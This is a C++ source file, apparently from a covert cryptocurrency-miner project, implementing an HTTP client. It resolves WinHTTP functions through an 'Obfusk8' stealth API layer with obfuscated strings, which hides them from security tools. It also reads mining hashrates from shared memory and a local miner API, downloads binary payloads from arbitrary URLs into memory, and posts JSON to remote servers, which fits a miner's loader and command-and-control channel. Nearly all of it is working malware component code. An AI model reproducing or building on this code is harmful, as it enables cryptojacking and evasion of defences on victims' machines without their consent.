#include "../include/http_client.h"
#include "../include/json.hpp"
#include "../include/encryption.h"
#include "../include/util.h"      // allocate_buffer()
#include <iostream>

// Include Obfusk8 for stealth API calling
#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

// Stealth function pointer types for WinHttp functions
typedef HINTERNET(WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
typedef BOOL(WINAPI *pWinHttpCloseHandle)(HINTERNET);
typedef BOOL(WINAPI *pWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);

std::string fetchJsonFromUrl(const std::wstring& url, int useSSL) {
    // Use stealth API resolution for WinHttp functions with string literals
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCrackUrl");
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpen");
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpConnect");
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpenRequest");
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpSendRequest");
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReceiveResponse");
    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpQueryDataAvailable");
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReadData");
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCloseHandle");

    if (!_WinHttpCrackUrl || !_WinHttpOpen) {
        std::cerr << OBFUSCATE_STRING("Failed to resolve WinHttp functions").c_str() << std::endl;
        return "";
    }

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        std::cerr << OBFUSCATE_STRING("Failed to parse URL.").c_str() << std::endl;
        return "";
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    std::string _uaNarrow = OBFUSCATE_STRING("WinHTTP/1.0");
    std::wstring userAgent(_uaNarrow.begin(), _uaNarrow.end());
    HINTERNET hSession = _WinHttpOpen(
        userAgent.c_str(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );
    if (!hSession) {
        std::cerr << OBFUSCATE_STRING("Failed to initialize WinHTTP.").c_str() << std::endl;
        return "";
    }

    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        _WinHttpCloseHandle(hSession);
        std::cerr << OBFUSCATE_STRING("Failed to connect to host.").c_str() << std::endl;
        return "";
    }

    // Determine SSL flag: use useSSL parameter if provided (1), otherwise check URL scheme
    DWORD flags = 0;
    if (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags = WINHTTP_FLAG_SECURE;
    }

    HINTERNET hRequest = _WinHttpOpenRequest(
        hConnect, 
        L"GET", 
        path.empty() ? L"/" : path.c_str(),
        NULL, 
        WINHTTP_NO_REFERER, 
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest) {
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        std::cerr << OBFUSCATE_STRING("Failed to create HTTP request.").c_str() << std::endl;
        return "";
    }

    if (!_WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        _WinHttpCloseHandle(hRequest);
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        std::cerr << OBFUSCATE_STRING("Failed to send HTTP request.").c_str() << std::endl;
        return "";
    }

    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        _WinHttpCloseHandle(hRequest);
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        std::cerr << OBFUSCATE_STRING("Failed to receive HTTP response.").c_str() << std::endl;
        return "";
    }

    std::string response;
    DWORD dwSize = 0;
    do {
        _WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!dwSize) break;

        char* buffer = new char[dwSize + 1];
        DWORD dwDownloaded = 0;
        if (_WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            buffer[dwDownloaded] = '\0';
            response += buffer;
        }
        delete[] buffer;
    } while (dwSize > 0);

    _WinHttpCloseHandle(hRequest);
    _WinHttpCloseHandle(hConnect);
    _WinHttpCloseHandle(hSession);

    return response;
}

double GetMinerHashrate() {
    HANDLE hMap = OpenFileMappingA(FILE_MAP_READ, FALSE, "Local\\Hashrate");
    if (!hMap) {
        return 0.0;
    }
    const auto *ptr = static_cast<const double *>(MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, sizeof(double)));
    double hashrate = 0.0;
    if (ptr) {
        hashrate = *ptr;
        UnmapViewOfFile(ptr);
    }
    CloseHandle(hMap);
    return hashrate;
}

// Get GPU miner (SRBMiner-MULTI) hashrate and unit from API endpoint
std::pair<double, std::string> GetGPUMinerHashrate() {
    std::string response = fetchJsonFromUrl(L"http://127.0.0.1:21550/stat");

    if (response.empty()) {
        return {0.0, "H/s"};
    }

    try {
        auto jsonObj = nlohmann::json::parse(response);

        // GMiner API (/stat): pool_speed + speed_unit
        if (jsonObj.contains("pool_speed") && jsonObj["pool_speed"].is_number()) {
            double hashrate = jsonObj["pool_speed"].get<double>();
            std::string unit = "H/s";
            if (jsonObj.contains("speed_unit") && jsonObj["speed_unit"].is_string()) {
                unit = jsonObj["speed_unit"].get<std::string>();
            }
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] GMiner pool_speed: " << hashrate << " " << unit << std::endl;
#endif
            return {hashrate, unit};
        }
    } catch (const std::exception& e) {
        std::cerr << "[-] Error parsing GMiner stats: " << e.what() << std::endl;
    }

    return {0.0, "H/s"};
}

// Download binary data from URL
BYTE* downloadBinaryFromUrl(const std::wstring& url, size_t& outSize, int useSSL) {
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCrackUrl");
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpen");
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpConnect");
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpenRequest");
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpSendRequest");
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReceiveResponse");
    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpQueryDataAvailable");
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReadData");
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCloseHandle");
    if (!_WinHttpCrackUrl || !_WinHttpOpen) { outSize = 0; return nullptr; }

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        outSize = 0; return nullptr;
    }

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    std::string _uaNarrow2 = OBFUSCATE_STRING("WinHTTP/1.0");
    std::wstring userAgent(_uaNarrow2.begin(), _uaNarrow2.end());
    HINTERNET hSession = _WinHttpOpen(userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { outSize = 0; return nullptr; }

    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) { _WinHttpCloseHandle(hSession); outSize = 0; return nullptr; }

    DWORD flags = (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"GET",
        path.empty() ? L"/" : path.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr; }

    if (!_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr;
    }
    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); outSize = 0; return nullptr;
    }

    std::vector<BYTE> buffer;
    DWORD dwSize = 0;
    do {
        _WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!dwSize) break;
        BYTE* tempBuffer = new BYTE[dwSize];
        DWORD dwDownloaded = 0;
        if (_WinHttpReadData(hRequest, tempBuffer, dwSize, &dwDownloaded))
            buffer.insert(buffer.end(), tempBuffer, tempBuffer + dwDownloaded);
        delete[] tempBuffer;
    } while (dwSize > 0);

    _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);

    if (buffer.empty()) { outSize = 0; return nullptr; }

    // allocate_buffer() so the caller's free_buffer()/VirtualFree() can actually
    // release this; a new[] here silently leaked the whole download.
    BYTE* result = allocate_buffer(buffer.size());
    if (!result) { outSize = 0; return nullptr; }

    memcpy(result, buffer.data(), buffer.size());
    outSize = buffer.size();
    return result;
}

std::string postJsonToUrl(const std::wstring& url, const std::string& jsonData, int useSSL) {
    pWinHttpCrackUrl _WinHttpCrackUrl = (pWinHttpCrackUrl)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCrackUrl");
    pWinHttpOpen _WinHttpOpen = (pWinHttpOpen)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpen");
    pWinHttpConnect _WinHttpConnect = (pWinHttpConnect)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpConnect");
    pWinHttpOpenRequest _WinHttpOpenRequest = (pWinHttpOpenRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpenRequest");
    pWinHttpAddRequestHeaders _WinHttpAddRequestHeaders = (pWinHttpAddRequestHeaders)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpAddRequestHeaders");
    pWinHttpSendRequest _WinHttpSendRequest = (pWinHttpSendRequest)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpSendRequest");
    pWinHttpReceiveResponse _WinHttpReceiveResponse = (pWinHttpReceiveResponse)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReceiveResponse");
    pWinHttpQueryDataAvailable _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpQueryDataAvailable");
    pWinHttpReadData _WinHttpReadData = (pWinHttpReadData)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReadData");
    pWinHttpCloseHandle _WinHttpCloseHandle = (pWinHttpCloseHandle)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCloseHandle");
    if (!_WinHttpCrackUrl || !_WinHttpOpen) return "";

    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!_WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) return "";

    std::wstring hostname(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    std::string _uaNarrow3 = OBFUSCATE_STRING("WinHTTP/1.0");
    std::wstring userAgent(_uaNarrow3.begin(), _uaNarrow3.end());
    HINTERNET hSession = _WinHttpOpen(userAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = _WinHttpConnect(hSession, hostname.c_str(), urlComp.nPort, 0);
    if (!hConnect) { _WinHttpCloseHandle(hSession); return ""; }

    DWORD flags = (useSSL == 1 || urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, L"POST",
        path.empty() ? L"/" : path.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return ""; }

    std::string _ctNarrow = OBFUSCATE_STRING("Content-Type: application/json");
    std::wstring contentType(_ctNarrow.begin(), _ctNarrow.end());
    if (_WinHttpAddRequestHeaders && !_WinHttpAddRequestHeaders(hRequest, contentType.c_str(), (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
    }

    if (!_WinHttpSendRequest(hRequest, NULL, 0, (void*)jsonData.c_str(), (DWORD)jsonData.length(), (DWORD)jsonData.length(), 0)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
    }
    if (!_WinHttpReceiveResponse(hRequest, NULL)) {
        _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession); return "";
    }

    std::string response;
    DWORD dwSize = 0;
    do {
        _WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!dwSize) break;
        char* buffer = new char[dwSize + 1];
        DWORD dwDownloaded = 0;
        if (_WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            buffer[dwDownloaded] = '\0';
            response += buffer;
        }
        delete[] buffer;
    } while (dwSize > 0);

    _WinHttpCloseHandle(hRequest); _WinHttpCloseHandle(hConnect); _WinHttpCloseHandle(hSession);
    return response;
}
